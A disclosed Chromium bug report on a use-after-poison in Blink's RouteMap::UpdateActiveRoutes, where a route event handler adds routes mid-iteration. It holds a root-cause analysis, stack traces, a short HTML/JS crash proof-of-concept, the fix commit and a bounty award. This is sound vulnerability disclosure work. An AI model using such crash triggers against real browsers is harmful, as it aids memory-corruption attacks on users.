# Use-After-Poison in RouteMap::UpdateActiveRoutes

| Field | Value |
|-------|-------|
| **Issue ID** | [467297219](https://issues.chromium.org/issues/467297219) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 142.0.0.0 |
| **Reporter** | an...@gmail.com |
| **Assignee** | ms...@chromium.org |
| **Created** | 2025-12-09 |
| **Bounty** | $8,000.00 |

## Description

# Steps to reproduce the problem

1. open test.html with flag --enable-blink-features=RouteMatching
2. click button
3. UAP!

# Problem Description

```
void RouteMap::UpdateActiveRoutes() {
  bool changed = false;
  for (const auto& entry : routes_) {
    Route& route = *entry.value;
    changed = route.UpdateMatchStatus(previous_url_, next_url_) || changed; //<= trigger JS
  }
  for (const auto& entry : anonymous_routes_) {
    Route& route = *entry.value;
    changed = route.UpdateMatchStatus(previous_url_, next_url_) || changed;
  }
  if (changed) {
    GetDocument().GetStyleEngine().NavigationsMayHaveChanged();
  }
}

// JS trigger this snippet

      if (it == routes_.end()) {
        routes_.insert(name, route); // <= insert to container, rehash happen and invalidate all iterators
      }
   

```
# Summary

Use-After-Poison in RouteMap::UpdateActiveRoutes

# Custom Questions

#### Type of crash:

tab

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A \

## Attachments

- [test.html](attachments/test.html) (text/html, 3.4 KB)
- [check.log](attachments/check.log) (text/plain, 27.6 KB)
- [asan.log](attachments/asan.log) (text/plain, 20.1 KB)

## Timeline

### an...@gmail.com (2025-12-09)

FYI: the Poc MUST be run in a server, i.e. setup pytohn server python -m http.server, and use http://localhost:8000/test.html

### an...@gmail.com (2025-12-09)

Logs in 145.0.7565.0, it's a DCHECK, but in stable release it is a UAP.

```
// args.gn
is_debug=false
symbol_level=2
is_asan=true
```

Update: I tested on the latest stable release 143.0.7499.40, it appears to be a UAP

### an...@gmail.com (2025-12-09)

Updated the asan log for 143.0.7499.40 (official build download using `get_asan_chrome.py`)

### an...@gmail.com (2025-12-09)

bisec: This is introduced in https://chromium.googlesource.com/chromium/src/+/f0b27358356059549d781056a859eff97ed04143%5E%21/third_party/blink/renderer/core/route_matching/route_map.cc, when the feature is implemented.

### an...@gmail.com (2025-12-09)

suggested fix, same as the one for b/1105426.
```c++
diff --git a/third_party/blink/renderer/core/route_matching/route_map.cc b/third_party/blink/renderer/core/route_matching/route_map.cc
index 1073440b46278..25bc3c2bfc8f7 100644
--- a/third_party/blink/renderer/core/route_matching/route_map.cc
+++ b/third_party/blink/renderer/core/route_matching/route_map.cc
@@ -207,11 +207,13 @@ bool RouteMap::MatchesURLPattern(const URLPattern* pattern,
 
 void RouteMap::UpdateActiveRoutes() {
   bool changed = false;
-  for (const auto& entry : routes_) {
+  auto local_routes = routes_;
+  for (const auto& entry : local_routes) {
     Route& route = *entry.value;
     changed = route.UpdateMatchStatus(previous_url_, next_url_) || changed;
   }
-  for (const auto& entry : anonymous_routes_) {
+  auto local_anonymous_routes = anonymous_routes_;
+  for (const auto& entry : local_anonymous_routes) {
     Route& route = *entry.value;
     changed = route.UpdateMatchStatus(previous_url_, next_url_) || changed;
   }

```

Note: both `routes_` and `anonymous_routes_` suffer from the js container re-entrance issue, which is the same pattern as b/1105426.
The for iteration in `GetActiveRoutes` does not involve JS-invoking functions like DispatchEvent. Thus does not need to be fixed.
 


### an...@gmail.com (2025-12-09)

Credit: Han Zheng (HexHive), Wenhao Fang (University of St. Andrews), and Qinying Wang (HexHive)

### an...@gmail.com (2025-12-09)

Detailed RCA:
```c++
void RouteMap::UpdateActiveRoutes() {
  bool changed = false;
  for (const auto& entry : routes_) {
    Route& route = *entry.value;
    changed = route.UpdateMatchStatus(previous_url_, next_url_) || changed; //<= [1] trigger JS
}
 //..
}
bool Route::UpdateMatchStatus(const KURL& previous_url, const KURL& next_url) {
 // ...
  auto* event = MakeGarbageCollected<RouteEvent>(type);
  event->SetTarget(this);
  DispatchEvent(*event); // [2]
  return true;
}
```

The `RouteMap::UpdateActiveRoutes` calls into the `Route::UpdateMatchStatus` in a `for` loop [1], which can fire a event and trigger a user-defined JS [2]. The attacker can set a eventlistener in js and executing the API call to force update, subsequently call into the C++ code `RouteMap::ParseRoutes` [3].
```c++
RouteMap::ParseResult RouteMap::ParseRoutes(const String& route_map_text) {
     //...
      if (it == routes_.end()) {
        routes_.insert(name, route); // [3]
      } 
}
```
The `ParseRoutes` insert elements in the `routers_`, which is being iterated in [1]. as `routers_` is a HeapHashMap, object insertation potentially invoke rehash, thus invalidating all iterators. When returing to the [1], the iterators will be invalidated, and any use of the `route` ([1]) in next iterations yeild UAP.


### li...@chromium.org (2025-12-09)

@ms...@chromium.org do you mind taking a look at this? It appears to be a consistent UAP within the RouteMap implementation. The reporter has included a suggested patch to fix.

### ms...@chromium.org (2025-12-09)

I'll have a look.

Note that this feature isn't enabled by default, only when running tests.

### an...@gmail.com (2025-12-09)

thanks for looking into it!

I dont agree with the severity assessment, from prior report history (<https://issues.chromium.org/issues/365802556#comment12>), if a bug is reachable in chrome with experimental flags, its still consider same severity and still vuln. so my understood is that this bug is still reachable and remain S1 vuln. please correct me if Im wrong.

### an...@gmail.com (2025-12-10)

also, this is a vulnerability with security\_impact-none tag, not a bug

### ms...@chromium.org (2025-12-10)

Also reproducible without asan. Regular debug build:

```
[2222189:2222223:1210/092056.208773:FATAL:third_party/blink/renderer/platform/wtf/hash_table.h:321] DCHECK failed: container_modifications_ == container_->Modifications() (1 vs. 2)
#0 0x7fd0ac0c33f9 base::debug::CollectStackTrace() [../../base/debug/stack_trace_posix.cc:1052:7]
#1 0x7fd0ac06fb5a base::debug::StackTrace::StackTrace() [../../base/debug/stack_trace.cc:279:20]
#2 0x7fd0ac06fac5 base::debug::StackTrace::StackTrace() [../../base/debug/stack_trace.cc:274:28]
#3 0x7fd0abd3c821 logging::LogMessage::Flush() [../../base/logging.cc:706:29]
#4 0x7fd0abd3c757 logging::LogMessage::~LogMessage() [../../base/logging.cc:695:3]
#5 0x7fd0abcee55b logging::(anonymous namespace)::DCheckLogMessage::~DCheckLogMessage() [../../base/check.cc:147:3]
#6 0x7fd0abcee589 logging::(anonymous namespace)::DCheckLogMessage::~DCheckLogMessage() [../../base/check.cc:143:32]
#7 0x7fd0abceeda8 std::__Cr::default_delete<>::operator()() [../../third_party/libc++/src/include/__memory/unique_ptr.h:74:5]
#8 0x7fd0abcee85a std::__Cr::unique_ptr<>::reset() [../../third_party/libc++/src/include/__memory/unique_ptr.h:288:7]
#9 0x7fd0abcedc39 logging::CheckError::~CheckError() [../../base/check.cc:306:16]
#10 0x7fd0824b69b4 blink::HashTableConstIterator<>::CheckModifications() [../../third_party/blink/renderer/platform/wtf/hash_table.h:321:5]
#11 0x7fd0824ba96c blink::HashTableConstIterator<>::operator++() [../../third_party/blink/renderer/platform/wtf/hash_table.h:340:5]
#12 0x7fd0824ba90d blink::HashTableIterator<>::operator++() [../../third_party/blink/renderer/platform/wtf/hash_table.h:457:5]
#13 0x7fd0824b4e89 blink::HashTableIteratorAdapter<>::operator++() [../../third_party/blink/renderer/platform/wtf/key_value_pair.h:201:5]
#14 0x7fd0824b16bc blink::RouteMap::UpdateActiveRoutes() [../../third_party/blink/renderer/core/route_matching/route_map.cc:192:26]
#15 0x7fd0820d8706 blink::RouteMap::OnNavigationStart() [../../third_party/blink/renderer/core/route_matching/route_map.h:99:5]
#16 0x7fd0820c5962 blink::NavigationApi::UpdateForNavigation() [../../third_party/blink/renderer/core/navigation_api/navigation_api.cc:310:15]
#17 0x7fd081ddb2db blink::DocumentLoader::UpdateForSameDocumentNavigation() [../../third_party/blink/renderer/core/loader/document_loader.cc:1128:40]
#18 0x7fd081dd831a blink::DocumentLoader::RunURLAndHistoryUpdateSteps() [../../third_party/blink/renderer/core/loader/document_loader.cc:1001:3]
#19 0x7fd0803cfe17 blink::History::StateObjectAdded() [../../third_party/blink/renderer/core/frame/history.cc:397:33]
#20 0x7fd0803cf819 blink::History::pushState() [../../third_party/blink/renderer/core/frame/history.cc:306:3]
#21 0x7fd083cf15f5 blink::(anonymous namespace)::v8_history::PushStateOperationCallback() [gen/third_party/blink/renderer/bindings/core/v8/v8_history.cc:301:17]
#22 0x7fd06e62df10 Builtins_CallApiCallbackGeneric

```

### ms...@chromium.org (2025-12-10)

```
<!DOCTYPE html>
<script type="routemap">
  {
    "routes": [
      {
        "name": "initial-route",
        "pattern": { "pathname": "/activate-me" }
      }
    ]
  }
</script>

REQUIREMENT: --enable-blink-features=RouteMatching

<script>
  const DYNAMIC_JSON = JSON.stringify({
    "routes": [
      {
        "name": "dynamic-route",
        "pattern": { "pathname": "/dynamic-path" }
      }
    ]
  });

  const route = document.routeMap.get('initial-route');
  route.addEventListener('activate', (e) => {
    const script = document.createElement('script');
    script.type = "routemap";
    script.textContent = DYNAMIC_JSON;
    document.head.appendChild(script);
  });
  history.pushState({}, '', '/activate-me');
</script>

```

### ch...@google.com (2025-12-10)

Setting milestone because of s0/s1 severity.

### ms...@chromium.org (2025-12-10)

Sigh. Really? I don't think we need to merge this anywhere. This flag isn't even enabled by `--enable-experimental-web-platform-features`

### dx...@google.com (2025-12-10)

Project: chromium/src  

Branch:  main  

Author:  Morten Stenshorne [mstensho@chromium.org](mailto:mstensho@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7246274>

[RouteMatching] Avoid recursion.

---


Expand for full commit details
```
     
    If another route was added in a route event handler, we'd end up 
    invoking RouteMap::UpdateMatchStatus() while already inside it. This is 
    bad. Fixing it by making a local copy of the routes and then walking 
    that set in UpdateMatchStatus() to prevent the set from being modified 
    (rehashed) while iterating it might seem compelling, but recursion here 
    doesn't seem good for correctness and code maintainability anyway. 
     
    Instead, fire route events as a separate step after having updated the 
    match status for all routes. Also do NOT trigger UpdateMatchStatus() 
    when adding new routes from <script>. Just update the match status with 
    no events being fired. Be sure to trigger a lifecycle update if anything 
    has changed, though. 
     
    <script type="routemap"> may be going away, in favor of the new @route 
    rule. See https://drafts.csswg.org/css-navigation-1/#at-route , and as 
    part of that task we should integrate route matching nicely into the 
    document lifecycle machinery. 
     
    Also add a DCHECK that fails on recursion. 
     
    Bug: 467297219 
    Change-Id: I604d3b29bf4a1cabf83a5c13f32c1dc01dbe84e8 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7246274 
    Commit-Queue: Morten Stenshorne <mstensho@chromium.org> 
    Reviewed-by: Noam Rosenthal <nrosenthal@google.com> 
    Cr-Commit-Position: refs/heads/main@{#1556793}

```

---

Files:

- M `third_party/blink/renderer/core/route_matching/route.cc`
- M `third_party/blink/renderer/core/route_matching/route_map.cc`
- M `third_party/blink/renderer/core/route_matching/route_map.h`
- A `third_party/blink/web_tests/wpt_internal/route/crashtests/add-route-on-activate.html`

---

Hash: [7710041f98212312f5810c831adca08157348975](https://chromiumdash.appspot.com/commit/7710041f98212312f5810c831adca08157348975)  

Date: Wed Dec 10 16:53:37 2025


---

### ch...@google.com (2025-12-11)

Security Merge Request Consideration: Requesting merge to extended stable (M142) because latest trunk commit (1556793) appears to be after extended stable branch point (1522585).
Security Merge Request Consideration: Requesting merge to stable (M143) because latest trunk commit (1556793) appears to be after stable branch point (1536371).
Security Merge Request Consideration: Requesting merge to beta (M144) because latest trunk commit (1556793) appears to be after beta branch point (1552494).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ms...@chromium.org (2025-12-11)

I really don't think merging is necessary, but if you insist, the one and only CL is above.

### ch...@google.com (2025-12-11)

Merge review required: M144 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2025-12-11)

Merge review required: M143 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2025-12-11)

Merge review required: M142 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), danielyip (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### wf...@chromium.org (2025-12-17)

hi re: test only code if this is test only why is this not behind a test only function e.g. ForTesting or only linked into the test binaries? If it's linked with Chrome (not only tests) then it would be in scope.

### an...@gmail.com (2025-12-17)

The code is linked inside Chrome, and requires run with additional flags.
i.e. running `./chrome --enable-blink-features=RouteMatching http://localhost:8000/poc.html`

Also, as per stacktrace in [b/467297219#comment13](https://issues.chromium.org/issues/467297219#comment13) and [b/467297219#comment4](https://issues.chromium.org/issues/467297219#comment4), the stack trace is a Chrome stacktrace, not in Testing.

### sp...@google.com (2025-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
baseline memory corruption in a sandboxed process + a bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-03-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> baseline memory corruption in a sandboxed process + a bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/467297219)*
